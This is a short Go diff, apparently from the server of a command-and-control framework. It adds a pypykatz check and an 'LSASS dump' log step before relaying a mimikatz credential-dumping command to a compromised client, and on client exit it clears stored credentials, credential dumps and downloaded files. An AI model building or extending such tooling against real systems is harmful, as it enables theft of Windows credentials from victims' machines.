@@ -47,6 +47,18 @@ func SendCommands(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 	}
 
+	// Check pypykatz availability before sending mimikatz command
+	if commands.Command == "mimikatz" {
+		if !database.HasPypykatz() {
+			c.JSON(http.StatusOK, gin.H{
+				"status": 400,
+				"msg":    "pypykatz not found on server. Install: pip install pypykatz",
+			})
+			return
+		}
+		logger.Info("Starting LSASS dump for", commands.Uid)
+	}
+
 	var shellHistory database.Shell
 	database.Engine.Where("uid = ?", commands.Uid).Get(&shellHistory)
 	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + commands.Command + "\n"
@@ -535,9 +547,15 @@ func ExitClient(c *gin.Context) {
 		}
 		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Socks5))
 		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Screenshots))
+		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Credentials))
+		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.CredentialDumps))
 		screenshotDir := filepath.Join("Screenshots", clientBody.Uid)
 		if _, err := os.Stat(screenshotDir); err == nil {
 			os.RemoveAll(screenshotDir)
+		}
+		dumpDir := filepath.Join("Downloads", clientBody.Uid)
+		if _, err := os.Stat(dumpDir); err == nil {
+			os.RemoveAll(dumpDir)
 		}
 		delete(command.UidFileBrowser, clientBody.Uid)
 	}()
